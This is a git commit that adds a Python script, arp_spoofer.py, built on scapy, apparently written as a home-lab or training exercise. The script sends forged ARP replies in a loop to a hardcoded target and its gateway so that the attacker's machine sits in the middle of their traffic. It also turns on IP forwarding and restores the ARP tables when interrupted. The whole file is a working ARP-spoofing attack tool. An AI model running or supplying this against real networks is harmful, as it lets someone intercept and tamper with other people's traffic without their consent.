10b2636156368a6ea3a759a9b5c049880d51801f
jsownz <jason@frozensoliddesigns.com>
2019-06-19 04:06:02 -0400

    adding vscode settings to git ignore, created arp spoofer

---
+++ arp_spoofer.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+import subprocess
+import time
+
+def get_mac(ip_address):
+    arp_request = scapy.ARP(pdst=ip_address)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    mac_address = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+# get these from commandline args
+target_ip = "10.0.2.8"
+gateway_ip = "10.0.2.1"
+
+try:
+    # start ip forwarding for packets
+    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
+    f.write("1")
+    f.close()
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print("\r[+] Sending ARP Spoof to " + target_ip + " and " + gateway_ip + " [Sent: " + str(sent_packets_count) + "]", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    # stop ip forwarding for packets
+    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
+    f.write("0")
+    f.close()
+    print("\n[+] Detected Ctrl+C -- Resetting ARP Tables")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
